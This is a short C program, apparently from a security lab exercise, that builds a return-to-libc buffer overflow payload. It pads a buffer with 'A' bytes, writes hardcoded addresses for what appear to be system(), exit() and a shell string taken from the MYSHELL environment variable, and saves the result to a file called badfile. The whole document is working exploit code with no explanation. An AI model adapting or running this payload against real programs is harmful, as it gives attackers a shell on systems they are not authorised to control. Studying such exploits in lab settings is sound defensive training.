/* exploit.c */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

void main(int argc, char **argv)
{
  char buffer[67];
  FILE *badfile;

  /* Enter As*/
  memset(&buffer, 0x41,55);
 //*(int *)&buffer[55] = 0x42424242;
 *(int *)&buffer[55] = 0xb7e5f430;
 *(int *)&buffer[59] = 0xb7e52fb0;
char *shell = getenv("MYSHELL");
if(shell)
printf("%x\n",shell);
  *(int *)&buffer[63] = 0xbffffe87;

  badfile = fopen("./badfile","w");
  fwrite(buffer, 67, 1, badfile);
  fclose(badfile);
}

